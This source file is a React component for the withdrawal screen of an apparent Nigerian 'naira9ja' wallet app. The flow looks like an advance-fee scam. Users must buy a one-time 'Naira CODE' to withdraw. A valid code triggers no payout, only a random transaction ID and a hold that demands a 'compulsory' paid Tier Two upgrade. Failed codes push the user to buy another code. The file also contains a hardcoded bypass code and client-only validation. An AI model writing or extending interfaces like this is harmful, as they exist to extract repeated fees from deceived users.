import React, { useState } from 'react';
import { Icons } from './Icons';
import { User } from '../types';
import { useAppSettings } from '../appSettings';
import { safeSaveUsersToLocalStorage } from '../firestoreService';

interface SendMoneyProps {
  user: User;
  onTransfer: (amount: number, recipientInfo: string) => void;
  onSubscribeRedirect: () => void;
  onUpgradeToTier2?: () => void;
  onGoHome: () => void;
}

const banks = [
  "OPAY",
  "PALMPAY",
  "KUDA",
  "MONIEPOINT",
  "Access Bank",
  "GTBank",
  "Zenith Bank",
  "UBA",
  "First Bank",
  "Fidelity Bank",
  "Union Bank",
  "FCMB",
  "Sterling Bank"
];

const SendMoney: React.FC<SendMoneyProps> = ({ 
  user, 
  onTransfer, 
  onSubscribeRedirect, 
  onUpgradeToTier2,
  onGoHome 
}) => {
  const settings = useAppSettings();
  const nairaCodePrice = settings.nairaCodePrice ?? 7000;
  const [step, setStep] = useState<'form' | 'pending' | 'failed'>('form');
  const [bank, setBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [nairaCode, setNairaCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [failureReason, setFailureReason] = useState<string>('');
  const [submittedTxId, setSubmittedTxId] = useState<string>('');

  // Calculate deactivation state dynamically
  const isDeactivated = user.deactivationDate && Date.now() > user.deactivationDate;

  const activeCodeObj = user.activeNairaCode;
  const hasUnusedActiveCode = activeCodeObj && !activeCodeObj.isUsed;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (isDeactivated) {
      setError("Account is restricted. Please contact service support.");
      return;
    }

    if (!nairaCode) {
      setError("Please enter your Naira CODE");
      return;
    }

    if (!accountName.trim()) {
      setError("Please enter the Account Name");
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    if (transferAmount > user.balance) {
      setError("Insufficient wallet balance for this withdrawal");
      return;
    }

    setIsLoading(true);

    const inputCodeClean = nairaCode.trim().toUpperCase();

    // Check validity
    let isValidCode = false;
    let isAlreadyUsed = false;

    if (activeCodeObj) {
      if (activeCodeObj.code.trim().toUpperCase() === inputCodeClean) {
        if (activeCodeObj.isUsed) {
          isAlreadyUsed = true;
        } else {
          isValidCode = true;
        }
      }
    }

    // Fallback legacy test code
    if (!isValidCode && inputCodeClean === 'NAIRAABC') {
      isValidCode = true;
    }

    setTimeout(() => {
      if (isValidCode) {
        // Mark code as used in user's state and localStorage
        try {
          const storedUsersStr = localStorage.getItem('naira9ja_users');
          if (storedUsersStr && user?.email) {
            const usersMap: Record<string, User> = JSON.parse(storedUsersStr);
            const userKey = user.email.toLowerCase();
            if (usersMap[userKey]) {
              if (usersMap[userKey].activeNairaCode) {
                usersMap[userKey].activeNairaCode!.isUsed = true;
                usersMap[userKey].activeNairaCode!.usedAt = Date.now();
              }
              if (user.activeNairaCode) {
                user.activeNairaCode.isUsed = true;
                user.activeNairaCode.usedAt = Date.now();
              }
              safeSaveUsersToLocalStorage(usersMap);
            }
          }
        } catch (e) {
          console.warn('Notice marking naira code as used:', e);
        }

        const generatedId = `TRX-${Math.floor(10000000 + Math.random() * 90000000)}`;
        setSubmittedTxId(generatedId);
        onTransfer(transferAmount, `Withdraw to ${bank} - ${accountName} (Pending Tier 2 Upgrade)`);
        setIsLoading(false);
        // Step transitions to 'pending' with compulsory Tier Two upgrade instructions
        setStep('pending');
      } else if (isAlreadyUsed) {
        setIsLoading(false);
        setFailureReason('This Naira CODE has already been used. Each Naira CODE is strictly for one-time use. Please purchase a new Naira CODE for your next withdrawal.');
        setStep('failed');
      } else {
        setIsLoading(false);
        setFailureReason('Invalid Naira CODE. Please make sure you enter the active CODE issued to your dashboard, or purchase a new one.');
        setStep('failed');
      }
    }, 1200);
  };

  if (isDeactivated) {
    return (
      <div className="px-4 py-8 flex flex-col items-center justify-center text-center space-y-4 animate-in zoom-in duration-300">
        <div className="w-16 h-16 bg-rose-100 rounded-full flex items-center justify-center border border-rose-200">
          <Icons.Ban size={30} className="text-rose-600" />
        </div>
        <div>
          <h2 className="text-base font-black text-slate-900 mb-1">Withdrawal Restricted</h2>
          <div className="bg-white p-3.5 rounded-2xl border border-pink-200 shadow-sm shadow-pink-500/5">
            <p className="text-rose-700 font-bold text-xs leading-relaxed">
              Your account requires verification before withdrawals can proceed.
            </p>
          </div>
        </div>
        <button 
          onClick={onGoHome}
          className="btn-black-blue w-full max-w-xs py-2 px-3 text-xs font-bold rounded-xl"
        >
          Back to Dashboard
        </button>
      </div>
    );
  }

  // PENDING WITHDRAWAL - COMPULSORY TIER TWO UPGRADE NOTICE
  if (step === 'pending') {
    return (
      <div className="px-4 py-4 flex flex-col items-center justify-center text-center space-y-3.5 animate-in zoom-in duration-300">
        
        {/* Animated Pending Icon with blue and yellow accents */}
        <div className="relative w-16 h-16 flex items-center justify-center">
          <div className="absolute inset-0 rounded-full bg-blue-500/20 animate-ping opacity-60"></div>
          <div className="w-14 h-14 rounded-full bg-amber-50 border-2 border-amber-400 flex items-center justify-center shadow-xs">
            <Icons.Clock size={28} className="text-amber-600 animate-spin" style={{ animationDuration: '6s' }} />
          </div>
          <div className="absolute -top-1 -right-1 w-4 h-4 rounded-full bg-blue-600 text-white flex items-center justify-center text-[9px] font-black shadow-xs">
            !
          </div>
        </div>

        {/* Title & Status */}
        <div className="space-y-1">
          <span className="inline-block px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 border border-amber-300 text-[10px] font-black uppercase tracking-wider">
            Withdrawal Status: PENDING ⏳
          </span>
          <h2 className="text-base font-black text-slate-900 tracking-tight">Withdrawal Placed on Hold</h2>
          <p className="text-slate-600 text-xs">
            Request of <strong className="text-slate-950 font-black">₦{parseFloat(amount || '0').toLocaleString()}</strong> to {accountName}
          </p>
        </div>

        {/* COMPULSORY TIER TWO (LEVEL 2) UPGRADE WARNING BOX */}
        <div className="bg-white p-4 rounded-3xl border-2 border-rose-400 shadow-md shadow-pink-500/10 w-full max-w-sm text-left space-y-2 relative overflow-hidden">
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-rose-500 via-blue-600 to-rose-500"></div>
          
          <div className="flex items-center space-x-2 text-rose-700">
            <Icons.AlertTriangle size={18} className="shrink-0 text-rose-600" />
            <h3 className="text-xs font-black uppercase tracking-wider">
              Compulsory: Tier Two Upgrade Required
            </h3>
          </div>

          <p className="text-[11px] text-slate-700 leading-relaxed font-medium">
            Your withdrawal has been registered and is currently <span className="font-bold text-amber-700">PENDING</span>.
          </p>
          
          <div className="p-2.5 bg-rose-50 rounded-xl border border-rose-200">
            <p className="text-[11px] text-rose-900 font-bold leading-snug">
              ⚠️ Attention: You must upgrade your account to <span className="underline font-black">Tier Two (Level 2)</span>. 
              This is <span className="text-rose-700 font-black uppercase">very compulsory</span>. Without upgrading your account to Tier Two, your withdrawal will NOT be successful or disbursed to your bank.
            </p>
          </div>

          <div className="pt-1 border-t border-pink-100 space-y-1 text-[10px]">
            <div className="flex justify-between text-slate-600">
              <span>Destination Bank:</span>
              <span className="font-bold text-slate-900">{bank}</span>
            </div>
            <div className="flex justify-between text-slate-600">
              <span>Account Number:</span>
              <span className="font-mono font-bold text-slate-900">{accountNumber}</span>
            </div>
            <div className="flex justify-between text-slate-600">
              <span>Reference ID:</span>
              <span className="font-mono text-blue-600">{submittedTxId || 'TRX-PENDING'}</span>
            </div>
          </div>
        </div>

        {/* Primary Action Buttons: Black with Touch of Blue */}
        <div className="w-full max-w-sm space-y-2 pt-1">
          <button 
            type="button"
            onClick={onUpgradeToTier2 ? onUpgradeToTier2 : onSubscribeRedirect}
            className="btn-black-blue w-full py-2.5 px-4 text-xs font-black rounded-xl uppercase tracking-wider flex items-center justify-center space-x-1.5"
          >
            <Icons.TrendingUp size={14} className="text-blue-400" />
            <span>⚡ Upgrade to Tier Two Now (Compulsory)</span>
          </button>

          <button 
            type="button"
            onClick={onGoHome}
            className="w-full py-2 text-slate-500 hover:text-slate-900 text-xs font-bold transition-colors"
          >
            Return to Dashboard
          </button>
        </div>
      </div>
    );
  }

  // FAILED STEP
  if (step === 'failed') {
    return (
      <div className="px-4 py-6 flex flex-col items-center justify-center text-center space-y-3.5 animate-in zoom-in duration-300">
        <div className="w-14 h-14 bg-rose-100 rounded-full flex items-center justify-center border border-rose-200">
          <Icons.X size={26} className="text-rose-600" />
        </div>
        <div>
          <span className="inline-block px-2.5 py-0.5 rounded-full bg-rose-100 text-rose-700 text-[10px] font-black uppercase tracking-wider border border-rose-200 mb-1">
            Verification Declined
          </span>
          <h2 className="text-base font-black text-slate-900">Withdrawal Not Processed</h2>
          <p className="text-slate-500 text-xs">
            Request of <span className="font-bold text-slate-900">₦{parseFloat(amount || '0').toLocaleString()}</span> could not be authorized.
          </p>
        </div>

        <div className="bg-white p-3.5 rounded-2xl w-full max-w-sm border border-rose-200 shadow-sm shadow-pink-500/5 text-left space-y-1">
          <p className="text-rose-600 text-[10px] font-black uppercase tracking-wider">Reason:</p>
          <p className="text-slate-700 text-xs font-medium leading-relaxed">
            {failureReason || "Please ensure you enter a valid, active Naira CODE issued to your dashboard."}
          </p>
        </div>

        <div className="w-full max-w-sm space-y-2 pt-1">
          <button 
            onClick={() => setStep('form')}
            className="w-full py-2 bg-pink-100 hover:bg-pink-200 text-slate-800 font-bold text-xs rounded-xl transition-all border border-pink-200 uppercase tracking-wider"
          >
            Try Again
          </button>
          <button 
            onClick={onSubscribeRedirect}
            className="btn-black-blue w-full py-2.5 px-3 text-xs font-bold rounded-xl uppercase tracking-wider flex items-center justify-center space-x-1"
          >
            <Icons.Key size={13} className="text-blue-400" />
            <span>Purchase New Naira CODE (₦{nairaCodePrice.toLocaleString()})</span>
          </button>
          <button 
            onClick={onGoHome}
            className="text-slate-400 text-xs hover:text-slate-700 transition-colors"
          >
            Back to Dashboard
          </button>
        </div>
      </div>
    );
  }

  // DEFAULT FORM STEP
  return (
    <div className="px-4 py-3 space-y-3.5 animate-in fade-in duration-300">
      <div className="text-center space-y-0.5">
        <h2 className="text-base font-black text-slate-900 tracking-tight">Withdraw Funds to Bank</h2>
        <p className="text-[11px] text-slate-500">Fast payout dispatches to any verified Nigerian bank</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-3 bg-white p-4 rounded-3xl border border-pink-200 shadow-sm shadow-pink-500/5">
        {error && (
          <div className="bg-rose-50 text-rose-700 text-xs p-2.5 rounded-xl text-center border border-rose-200 font-bold">
            {error}
          </div>
        )}

        <div>
          <label className="block text-[10px] font-black text-slate-600 uppercase tracking-wider mb-1">
            Select Bank
          </label>
          <div className="relative">
            <select
              value={bank}
              onChange={(e) => setBank(e.target.value)}
              required
              className="w-full py-2 px-3 bg-pink-50/40 border border-pink-200 rounded-xl appearance-none text-slate-900 focus:outline-none focus:border-blue-500 text-xs font-medium"
            >
              <option value="" disabled>Choose a bank</option>
              {banks.map(b => (
                <option key={b} value={b}>{b}</option>
              ))}
            </select>
            <Icons.ChevronRight className="absolute right-3 top-2.5 text-slate-400 rotate-90" size={14} />
          </div>
        </div>

        <div>
          <label className="block text-[10px] font-black text-slate-600 uppercase tracking-wider mb-1">
            Account Number
          </label>
          <input
            type="number"
            value={accountNumber}
            onChange={(e) => {
              if (e.target.value.length <= 10) setAccountNumber(e.target.value);
            }}
            placeholder="0123456789 (10 Digits)"
            required
            className="w-full py-2 px-3 bg-pink-50/40 border border-pink-200 rounded-xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-blue-500 font-mono text-xs tracking-wider"
          />
        </div>

        <div>
          <label className="block text-[10px] font-black text-slate-600 uppercase tracking-wider mb-1">
            Account Name
          </label>
          <input
            type="text"
            value={accountName}
            onChange={(e) => setAccountName(e.target.value)}
            placeholder="Recipient Full Name"
            required
            className="w-full py-2 px-3 bg-pink-50/40 border border-pink-200 rounded-xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-blue-500 text-xs font-semibold"
          />
        </div>

        <div>
          <label className="block text-[10px] font-black text-slate-600 uppercase tracking-wider mb-1">
            Withdrawal Amount (₦)
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-slate-400 font-bold text-xs">₦</span>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              required
              className="w-full py-2 pl-7 pr-3 bg-pink-50/40 border border-pink-200 rounded-xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-blue-500 font-bold text-xs"
            />
          </div>
          <div className="flex justify-between items-center text-[10px] text-slate-500 mt-1">
            <span>Available Balance:</span>
            <strong className="text-slate-900 font-mono">₦{user.balance.toLocaleString()}</strong>
          </div>
        </div>

        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-[10px] font-black text-slate-600 uppercase tracking-wider">
              Naira CODE
            </label>
            {hasUnusedActiveCode && (
              <button
                type="button"
                onClick={() => setNairaCode(activeCodeObj.code)}
                className="text-[9px] font-black text-blue-700 bg-pink-100 hover:bg-pink-200 px-2 py-0.5 rounded-lg border border-pink-200 transition-all flex items-center space-x-1"
              >
                <Icons.Key size={10} className="text-blue-600" />
                <span>Use Active: {activeCodeObj.code}</span>
              </button>
            )}
          </div>
          <input
            type="text"
            value={nairaCode}
            onChange={(e) => setNairaCode(e.target.value)}
            placeholder={hasUnusedActiveCode ? activeCodeObj.code : "Enter 1-time Naira CODE"}
            required
            className="w-full py-2 px-3 bg-pink-50/40 border border-pink-200 rounded-xl text-slate-900 font-mono text-xs placeholder:text-slate-400 focus:outline-none focus:border-blue-500 uppercase tracking-wider font-bold"
          />
          <div className="flex justify-end mt-1">
            <button 
              type="button"
              onClick={onSubscribeRedirect}
              className="text-[10px] text-blue-600 font-bold hover:underline inline-flex items-center space-x-1"
            >
              <span>Need a code? Buy Naira CODE →</span>
            </button>
          </div>
        </div>

        <button
          type="submit"
          disabled={isLoading || !bank || !accountNumber || !amount || !nairaCode || !accountName}
          className="btn-black-blue w-full py-2.5 px-4 text-xs font-black rounded-xl uppercase tracking-wider flex items-center justify-center space-x-1.5 disabled:opacity-50 mt-2"
        >
          {isLoading ? (
            <span>Verifying & Submitting...</span>
          ) : (
            <>
              <span>Submit Withdrawal Request</span>
              <Icons.ArrowUpRight size={14} className="text-blue-400" />
            </>
          )}
        </button>
      </form>
    </div>
  );
};

export default SendMoney;
